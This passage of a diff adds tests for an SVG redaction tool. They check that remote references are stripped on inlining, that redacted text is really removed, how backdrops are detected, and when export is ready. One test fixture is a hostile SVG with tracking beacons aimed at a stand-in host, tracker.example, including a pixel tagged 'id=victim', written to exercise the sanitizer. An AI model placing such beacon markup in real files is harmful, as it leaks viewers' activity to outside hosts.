+  <style>@font-face { font-family: t; src: url(https://tracker.example/f.woff2) }
+    .a { fill: url("//tracker.example/g.svg#g") } .b { fill: url(#local) }</style>
+  <image href="https://tracker.example/px.png?id=victim" x="0" y="0" width="10" height="10"/>
+  <image xlink:href="beacon.png" x="0" y="0" width="10" height="10"/>
+  <image href="data:image/png;base64,AAAA" x="0" y="0" width="10" height="10"/>
+  <use href="#local"/>
+  <rect fill="url(http://tracker.example/p.svg#p)" width="5" height="5"/>
+</svg>`;
+  const out = prepareInlineSvg(hostile, { natW: 200, natH: 100 });
+  assert.doesNotMatch(out, /tracker\.example/, 'no remote reference survives inlining');
+  assert.doesNotMatch(out, /beacon\.png/, 'a relative path resolves against the APP origin');
+  // What the file legitimately carries is kept, or the preview stops being a
+  // preview of the file the user is redacting.
+  assert.match(out, /data:image\/png;base64,AAAA/);
+  assert.match(out, /href="#local"/);
+  assert.match(out, /fill:\s*url\(#local\)/);
+});
+
+test('redact: a deleted <use> takes its top-level <symbol> master with it', async () => {
+  const hooks = loadHooks();
+  const { prepareInlineSvg } = loadGeom();
+  // The sprite idiom: the master is a <symbol> at the top level, NOT a <defs>
+  // child, so a sweep scoped to <defs> left the text in the file with the
+  // export gate silent — the <use> it deleted carries no text of its own.
+  const sprite = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">
+  <symbol id="sec"><text x="0" y="10">TOPSECRETNAME</text></symbol>
+  <use href="#sec" x="10" y="20"/>
+  <text x="10" y="90">Public line</text>
+</svg>`;
+  const inline = prepareInlineSvg(sprite, { natW: 200, natH: 100 });
+  const useIdx = Number(/<use[^>]*\bdata-rdn="(\d+)"/.exec(inline)![1]);
+  const res = await hooks.exportFile({
+    model: modelFor(fileRef('s.svg', 'image/svg+xml', svgBytes(sprite)), {
+      svgVector: true,
+      bars: [drawn(8, 14, 90, 22, { n: `m:${useIdx}` })],
+    }),
+    host: BARE_HOST,
+  });
+  const out = new TextDecoder().decode(res.bytes);
+  assert.doesNotMatch(out, /TOPSECRETNAME/, 'the master goes with its only instance');
+  assert.doesNotMatch(out, /<symbol/);
+  assert.match(out, /Public line/, 'nothing else is disturbed');
+});
+
+test('redact resnap: a settled bar\'s addresses are rewritten to what it touches NOW', () => {
+  const resnap = loadTemplateResnap();
+  const { parseNodeMarks } = loadGeom();
+  const W = 300, H = 150;
+  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
+  const nodes = [{ idx: 41, x: 10, y: 20, w: 40, h: 30 }];
+
+  // Moved in the sidebar (or applied to the next file of a batch) so it now
+  // fully contains a DIFFERENT node while still claiming the old one. Left
+  // alone, vector export deletes node 7 — nowhere near a bar — and paints an
+  // opaque rect over node 41, whose text stays in the file, recoverable in a
+  // text editor, with the gate green because it only greps what was removed.
+  const moved = { page: 1, x: 5, y: 15, w: 55, h: 45, n: 'm:7' };
+  const out = resnap.plan([moved], 1, nodes, W, H, eff);
+  assert.equal(out.changed, true, 'a stale address is a leak, measured or not');
+  assert.deepEqual(parseNodeMarks(out.next[0].n), [41]);
+  // The geometry is the user's and is not touched — only the addresses were wrong.
+  assert.equal(out.next[0].x, 5);
+  assert.equal(out.next[0].w, 55);
+  // And it settles in one pass, like every other correction.
+  assert.equal(resnap.plan(out.next, 1, nodes, W, H, eff).changed, false);
+});
+
+test('redact: a full-page backdrop is not an element a bar was aimed at', () => {
+  const { isBackdropNode, snapBarToNodes } = loadGeom();
+  const W = 612, H = 792;
+  // A scanned page is ONE <image> at page size (engine pdf-svg emits exactly
+  // that); an Illustrator export opens with a full-artboard <rect>.
+  assert.equal(isBackdropNode({ x: 0, y: 0, w: 612, h: 792 }, W, H), true);
+  assert.equal(isBackdropNode({ x: 10, y: 100, w: 200, h: 12 }, W, H), false);
+  // With the backdrop excluded, a strike over one line grows to that line only.
+  const nodes = [{ idx: 5, x: 60, y: 300, w: 180, h: 14 }];
+  const s = snapBarToNodes({ x: 62, y: 305, w: 170, h: 4 }, nodes);
+  assert.ok(s.w < W / 2 && s.h < 40, `a bar must not become the page: ${JSON.stringify(s)}`);
+});
+
+test('redact: the mark radius scales with the file, so Branded never reads as Solid', () => {
+  const { markRadiusFor } = loadGeom();
+  assert.equal(markRadiusFor('solid', 3024, 4032), 0, 'solid is square at any size');
+  assert.equal(markRadiusFor('branded'), 3, 'no frame named: the base radius');
+  assert.equal(markRadiusFor('branded', 612, 792), 4, 'a page keeps a slight softening');
+  assert.equal(markRadiusFor('branded', 3024, 4032), 14, 'a phone photo gets a visible one');
+  assert.equal(markRadiusFor('branded', 40, 40), 3, 'never below the base');
+});
+
+test('redact: the mirrored backdrop rule matches the hook\'s, case by case', () => {
+  const hook = loadGeom();
+  const tmpl = loadTemplateGeom();
+  const cases = [
+    [{ x: 0, y: 0, w: 612, h: 792 }, 612, 792],
+    [{ x: 0, y: 0, w: 520, h: 792 }, 612, 792],
+    [{ x: 0, y: 0, w: 612, h: 600 }, 612, 792],
+    [{ x: 5, y: 5, w: 600, h: 780 }, 612, 792],
+    [{ x: 0, y: 0, w: 10, h: 10 }, 0, 0],
+  ] as const;
+  for (const [nb, W, H] of cases) {
+    assert.equal(tmpl.isBackdropNode(nb, W, H), hook.isBackdropNode(nb, W, H),
+      `isBackdropNode ${JSON.stringify(nb)} in ${W}x${H}`);
+  }
+});
+
+test('redact (e2e): the snap-to-cover promise is only made for a file that can be measured', async () => {
+  // An SVG whose root declares neither a px width/height pair nor a viewBox has
+  // no size the hook can map bars into, so it falls back to the <img> preview —
+  // where nothing can be measured. isRaster is still false, so the hint used to
+  // promise a bar "can never clip a word in half" for a file where no bar ever
+  // grows. Absent a measurable frame, the tool says what it actually does.
+  const sizeless = '<svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">hello there</text></svg>';
+  const rt = await createRuntime(redactTool(), BARE_HOST, {
+    source: fileRef('sizeless.svg', 'image/svg+xml', svgBytes(sizeless)),
+  });
+  const html = rt.getHydrated();
+  assert.doesNotMatch(html, /data-rdsvg/, 'no inline SVG, so no node bounds');
+  assert.doesNotMatch(html, /can never clip a word in half/);
+  assert.match(html, /Nothing in this file could be measured/);
+
+  // A sized one inlines, and gets the promise.
+  const sized = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100"><text x="10" y="20">hello there</text></svg>';
+  const ok = await createRuntime(redactTool(), BARE_HOST, {
+    source: fileRef('sized.svg', 'image/svg+xml', svgBytes(sized)),
+  });
+  assert.match(ok.getHydrated(), /can never clip a word in half/);
+});
+
+test('redact (e2e): the stage marks itself not-ready while bars are still unmeasured', async () => {
+  // Automation clicks [data-export-file] the moment it enables. On a measurable
+  // file, bars that arrived as instructions have not been snapped to cover yet,
+  // so the surface says so and the CLI/MCP browser tiers wait for it.
+  const sized = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100"><text x="10" y="20">hello there</text></svg>';
+  const src = fileRef('sized.svg', 'image/svg+xml', svgBytes(sized));
+
+  const pending = await createRuntime(redactTool(), BARE_HOST, {
+    source: src, bars: [{ page: 1, x: 8, y: 8, w: 60, h: 14 }],
+  });
+  // Match the STAGE tag, not the file: the markup carries a comment explaining
+  // the attribute, which a bare search would find on every render.
+  const onStage = (html: string) => /<div class="rd-stage"[^>]*\sdata-export-wait=/.test(html);
+  assert.equal(onStage(pending.getHydrated()), true);
+
+  // Measured on the canvas: nothing left to wait for.
+  const settled = await createRuntime(redactTool(), BARE_HOST, {
+    source: src, bars: [drawn(8, 8, 60, 14)],
+  });
+  assert.equal(onStage(settled.getHydrated()), false);
+
+  // Flat pixels can never be measured, so the wait must never latch on.
+  const raster = await createRuntime(redactTool(), BARE_HOST, {
+    source: fileRef('shot.png', 'image/png', buildDirtyPng()),
+    bars: [{ page: 1, x: 8, y: 8, w: 60, h: 14 }],
+  });
+  assert.equal(onStage(raster.getHydrated()), false);
 });
